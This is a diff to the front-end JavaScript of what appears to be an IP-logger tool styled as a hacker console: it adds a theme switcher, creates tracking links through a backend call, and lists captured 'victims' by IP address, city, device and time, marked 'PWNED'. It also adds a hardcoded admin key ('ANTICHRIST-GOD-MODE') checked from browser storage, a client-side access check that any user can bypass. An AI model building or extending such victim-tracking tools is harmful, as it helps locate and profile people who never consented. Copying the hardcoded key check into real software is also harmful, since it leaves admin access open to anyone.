@@ -281,24 +281,69 @@ window.AC = window.AC || {};
     });
   }
 
+  // ── Theme Engine ──────────────────────────────────────────
+  function initTheme() {
+    var savedTheme = localStorage.getItem('ac_theme') || 'ghost';
+    applyTheme(savedTheme);
+
+    document.querySelectorAll('.theme-btn').forEach(function (btn) {
+      btn.addEventListener('click', function () {
+        var t = btn.dataset.setTheme;
+        if (t) applyTheme(t);
+      });
+    });
+  }
+
+  function applyTheme(theme) {
+    document.documentElement.setAttribute('data-theme', theme);
+    localStorage.setItem('ac_theme', theme);
+
+    var titleEl = document.getElementById('header-console-title');
+    var iconEl = document.getElementById('header-logo-icon');
+    if (titleEl) {
+      titleEl.textContent = (theme === 'neon') ? 'NEON // CONSOLE' : 'GHOST // CONSOLE';
+    }
+    if (iconEl) {
+      iconEl.textContent = (theme === 'neon') ? '🔮' : '⚡';
+    }
+
+    document.querySelectorAll('.theme-btn').forEach(function (b) {
+      var isCur = b.dataset.setTheme === theme;
+      if (theme === 'ghost') {
+        b.style.background = isCur ? '#1a1d26' : '#12141a';
+        b.style.borderColor = isCur ? '#38bdf8' : '#242835';
+        b.style.color = isCur ? '#fff' : '#64748b';
+      } else {
+        b.style.background = isCur ? '#1a0e30' : '#100b1a';
+        b.style.borderColor = isCur ? '#c026d3' : '#3b1d5c';
+        b.style.color = isCur ? '#fff' : '#8b5cf6';
+      }
+    });
+  }
+
   // ── Dashboard ─────────────────────────────────────────────
   function startDashboard() {
     // Update user badge in header
     var userNickEl = document.getElementById('header-user-nick');
+    var isAdmin = (state.userRole === 'admin' || state.userKey === 'ANTICHRIST-GOD-MODE' || localStorage.getItem('ac_key') === 'ANTICHRIST-GOD-MODE');
+
     if (userNickEl) {
-      userNickEl.textContent = state.userRole === 'admin' ? '⚡ ADMIN' : ('👤 ' + (state.userNickname || 'USER'));
+      userNickEl.textContent = isAdmin ? '⚡ ROOT // LO' : ('OPERATOR // ' + (state.userNickname || 'ANON'));
     }
 
-    // Update links remaining
-    var linksEl = document.getElementById('links-remaining');
-    if (linksEl) {
-      linksEl.textContent = state.linksRemaining + '/' + state.linksTotal;
+    // Direct God-Mode button in header
+    var godModeBtn = document.getElementById('btn-admin-godmode');
+    if (godModeBtn) {
+      godModeBtn.style.display = isAdmin ? 'inline-block' : 'none';
+      godModeBtn.onclick = function () {
+        showScreen('admin');
+      };
     }
 
     // Ensure Admin tab in nav is displayed if admin
     var adminNav = document.getElementById('nav-item-admin');
     if (adminNav) {
-      adminNav.style.display = (state.userRole === 'admin' || state.userKey === 'ANTICHRIST-GOD-MODE') ? 'flex' : 'none';
+      adminNav.style.display = isAdmin ? 'flex' : 'none';
     }
 
     // Start log ticker
@@ -307,35 +352,10 @@ window.AC = window.AC || {};
       var cancel = window.AC.anim.logTicker(tickerEl);
       state.cancelFunctions.push(cancel);
     }
-
-    // Start random notifications
-    if (window.AC.notify) {
-      var cancel2 = window.AC.notify.startRandom();
-      state.cancelFunctions.push(cancel2);
-    }
   }
 
   function initDashboard() {
-    // Target cards
-    var cards = document.querySelectorAll('.target-card');
-    cards.forEach(function (card) {
-      card.addEventListener('click', function () {
-        cards.forEach(function (c) { c.classList.remove('selected'); });
-        card.classList.add('selected');
-        state.selectedTarget = card.dataset.target;
-      });
-    });
-
-    // Toggles
-    document.querySelectorAll('.toggle-switch').forEach(function (toggle) {
-      toggle.addEventListener('click', function () {
-        toggle.classList.toggle('active');
-        var key = toggle.dataset.config;
-        if (key && state.config.hasOwnProperty(key)) {
-          state.config[key] = toggle.classList.contains('active');
-        }
-      });
-    });
+    initTheme();
 
     // Link type selection cards
     var typeCards = document.querySelectorAll('.link-type-card');
@@ -343,10 +363,18 @@ window.AC = window.AC || {};
       card.addEventListener('click', function () {
         typeCards.forEach(function (c) {
           c.classList.remove('selected');
-          c.style.borderColor = '#222';
+          c.style.borderColor = 'var(--border-color)';
+          c.style.boxShadow = 'none';
+          c.style.background = 'var(--bg-secondary)';
+          var nameEl = c.querySelector('div[style*="font-weight:700"]');
+          if (nameEl) nameEl.style.color = 'var(--text-secondary)';
         });
         card.classList.add('selected');
-        card.style.borderColor = 'var(--accent-red)';
+        card.style.borderColor = 'var(--accent-primary)';
+        card.style.boxShadow = '0 0 12px var(--accent-primary-glow)';
+        card.style.background = 'var(--bg-card)';
+        var curNameEl = card.querySelector('div[style*="font-weight:700"]');
+        if (curNameEl) curNameEl.style.color = '#fff';
         state.selectedLinkType = card.dataset.type;
       });
     });
@@ -416,10 +444,14 @@ window.AC = window.AC || {};
     if (terminalEl) terminalEl.innerHTML = '';
     if (ipScannerEl) ipScannerEl.innerHTML = '';
 
-    // Start terminal
-    var lines = window.AC.gen.terminalLines(state.selectedTarget);
+    // Snappy tactical terminal sequence (~1.5s)
+    var lines = [
+      { text: '[*] Engaging tactical payload engine...', delay: 100, type: 'info' },
+      { text: '[+] Binding proxy node & SSL cert...', delay: 150, type: 'info' },
+      { text: '[+] Initializing target fingerprint listener...', delay: 200, type: 'info' },
+      { text: '[✓] SUCCESS: Payload armed and ready.', delay: 150, type: 'success' }
+    ];
     var cancelTerminal = window.AC.terminal.start(terminalEl, lines, function () {
-      // Terminal complete — call real IPLogger API
       setTimeout(function () {
         // Call backend to create real tracking link
         fetch('/api/create-link', {
@@ -694,40 +726,72 @@ window.AC = window.AC || {};
     });
   }
 
+  // ── Victims Screen & Cards List ───────────────────────────
   function renderVictimsTable(tableEl, tableBody, emptyMsg, vClicks, vCap) {
     var totalCaptured = state.victims.length;
-
     if (vClicks) vClicks.textContent = totalCaptured;
     if (vCap) vCap.textContent = totalCaptured;
 
-    if (!tableBody) return;
+    var cardsList = document.getElementById('victims-cards-list');
 
     if (state.victims.length === 0) {
+      if (cardsList) cardsList.style.display = 'none';
       if (tableEl) tableEl.style.display = 'none';
       if (emptyMsg) emptyMsg.style.display = 'block';
       return;
     }
 
-    if (tableEl) tableEl.style.display = 'table';
     if (emptyMsg) emptyMsg.style.display = 'none';
 
-    tableBody.innerHTML = '';
-    state.victims.forEach(function (victim, i) {
-      var row = document.createElement('tr');
-      row.className = 'victim-row';
-      row.innerHTML =
-        '<td>' + (i + 1) + '</td>' +
-        '<td class="mono"><span class="text-red">' + (victim.ip || 'unknown') + '</span></td>' +
-        '<td class="mono">' + (victim.city || victim.country || 'unknown') + '</td>' +
-        '<td style="font-size:0.7rem">' + (victim.device || 'unknown') + '</td>' +
-        '<td><span class="badge status-pwned">LOGGED</span></td>';
+    // Render modern mobile tactical cards
+    if (cardsList) {
+      cardsList.style.display = 'flex';
+      cardsList.innerHTML = '';
 
-      row.addEventListener('click', function () {
-        showVictimDetail(victim);
+      state.victims.forEach(function (v) {
+        var card = document.createElement('div');
+        card.style.cssText = 'background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:8px;padding:0.75rem 1rem;display:flex;justify-content:space-between;align-items:center;cursor:pointer;transition:all 0.2s;';
+        card.onmouseover = function() { card.style.borderColor = 'var(--accent-primary)'; };
+        card.onmouseout = function() { card.style.borderColor = 'var(--border-color)'; };
+
+        var isMobile = /iPhone|iPad|Android|Mobile/i.test(v.device || v.userAgent);
+        var devIcon = isMobile ? '📱' : '💻';
+        var loc = [v.city, v.country].filter(Boolean).join(', ') || 'Unknown Geo';
+        var time = v.timestamp ? new Date(v.timestamp).toLocaleTimeString() : '';
+
+        card.innerHTML =
+          '<div>' +
+            '<div style="display:flex;align-items:center;gap:0.4rem;margin-bottom:0.25rem;">' +
+              '<span style="font-size:1rem;">' + devIcon + '</span>' +
+              '<span class="mono" style="font-weight:bold;color:var(--accent-primary);font-size:0.85rem;">' + (v.ip || 'unknown') + '</span>' +
+            '</div>' +
+            '<div style="font-size:0.7rem;color:var(--text-dim);font-family:var(--font-mono);">' + loc + ' · ' + (v.device || 'Device') + ' · ' + time + '</div>' +
+          '</div>' +
+          '<div>' +
+            '<span style="background:var(--accent-primary-glow);color:var(--accent-primary);border:1px solid var(--accent-primary);padding:0.25rem 0.5rem;border-radius:4px;font-size:0.65rem;font-family:var(--font-mono);font-weight:bold;">PWNED</span>' +
+          '</div>';
+
+        card.addEventListener('click', function () { showVictimDetail(v); });
+        cardsList.appendChild(card);
       });
+    }
 
-      tableBody.appendChild(row);
-    });
+    // Also populate table as fallback
+    if (tableBody) {
+      tableBody.innerHTML = '';
+      state.victims.forEach(function (victim, i) {
+        var row = document.createElement('tr');
+        row.className = 'victim-row';
+        row.innerHTML =
+          '<td>' + (i + 1) + '</td>' +
+          '<td class="mono"><span class="text-red">' + (victim.ip || 'unknown') + '</span></td>' +
+          '<td class="mono">' + (victim.city || victim.country || 'unknown') + '</td>' +
+          '<td style="font-size:0.7rem">' + (victim.device || 'unknown') + '</td>' +
+          '<td><span class="badge status-pwned">LOGGED</span></td>';
+        row.addEventListener('click', function () { showVictimDetail(victim); });
+        tableBody.appendChild(row);
+      });
+    }
   }
 
   function showVictimDetail(victim) {
